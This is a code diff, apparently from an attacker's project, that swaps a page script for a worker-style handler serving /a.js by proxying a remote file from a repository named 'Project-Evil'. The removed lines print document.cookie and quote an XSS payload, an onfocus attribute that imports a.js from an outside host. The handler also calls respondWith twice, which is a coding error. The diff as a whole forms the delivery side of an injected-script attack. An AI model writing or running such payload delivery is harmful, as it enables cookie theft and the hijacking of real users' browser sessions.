@@ -1,25 +1,8 @@
-console.log('selam');
-console.log(document.cookie);
-
-(function() {
-  const zararlilar = [
-    '`autofocus onfocus=import(\'https://abbb.3d.tc/a.js\');`'
-  ];
-  const hedefRegex = /<script\s+type=module\s+src=[^>]+><\/script>/gi;
-
-  function temizleNode(node) {
-    if(node.nodeType === Node.TEXT_NODE) {
-      zararlilar.forEach(z => { node.nodeValue = node.nodeValue.replaceAll(z, ''); });
-      node.nodeValue = node.nodeValue.replace(hedefRegex, '');
-    } else if(node.nodeType === Node.ELEMENT_NODE) {
-      if(node.tagName === 'INPUT' || node.tagName === 'TEXTAREA') {
-        if(node.value) node.value = node.value.replace(hedefRegex, '');
-      }
-      node.childNodes.forEach(temizleNode);
-    }
+addEventListener('fetch', event => {
+  const url = new URL(event.request.url);
+  if(url.pathname === '/a.js'){
+    event.respondWith(fetch('https://cdn.jsdelivr.net/gh/S3ns1l1ss/Project-Evil@42f7c6b/a.js'));
+    event.respondWith(fetch('https://cdn.jsdelivr.net/gh/S3ns1l1ss/Project-Evil@3cac790/a.js'));
+  } else {
+    event.respondWith(fetch(event.request));
   }
-
-  temizleNode(document.body);
-})();
-
-export {};
